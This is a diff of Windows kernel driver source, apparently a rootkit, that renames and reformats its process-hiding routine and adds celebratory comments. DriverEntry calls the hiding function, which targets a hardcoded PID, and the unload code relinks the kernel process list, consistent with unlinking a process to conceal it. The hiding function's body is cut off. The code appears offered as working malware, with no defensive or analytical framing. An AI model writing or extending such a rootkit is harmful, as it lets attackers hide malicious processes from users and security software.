@@ -1,6 +1,10 @@
+// YATTTAAAA ❗❗❗❗❗
+// <3
+//-------------------
 #include "rkep.h"
 
-VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
+VOID 
+OnUnload(IN PDRIVER_OBJECT DriverObject)
 {
     UNICODE_STRING DeviceLinkString;
     KdPrint(("Driver Unload() Called...\n"));
@@ -11,7 +15,8 @@ VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
     pList->Flink->Blink = pList;
 }
 
-NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING theRegistryPath)
+NTSTATUS 
+DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING theRegistryPath)
 {
     NTSTATUS ntStatus = STATUS_SUCCESS;
     UNICODE_STRING ntDeviceName;
@@ -41,10 +46,11 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING theRegis
     DriverObject->DriverUnload = OnUnload;
 
     KdPrint(("Driver DriverEntry Called...\n"));
-    return HideProcess();
+    return Prcc_Hiding();
 }
 
-NTSTATUS Dispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+NTSTATUS 
+Dispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 {
     NTSTATUS ntStatus = STATUS_NOT_SUPPORTED;
     KdPrint(("Driver Dispath Called...\n"));
@@ -52,7 +58,8 @@ NTSTATUS Dispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
     return ntStatus;
 }
 
-NTSTATUS HideProcess()
+NTSTATUS 
+Prcc_Hiding()
 {
     PEPROCESS ePro = NULL;
     int terminate_PID = 1076;
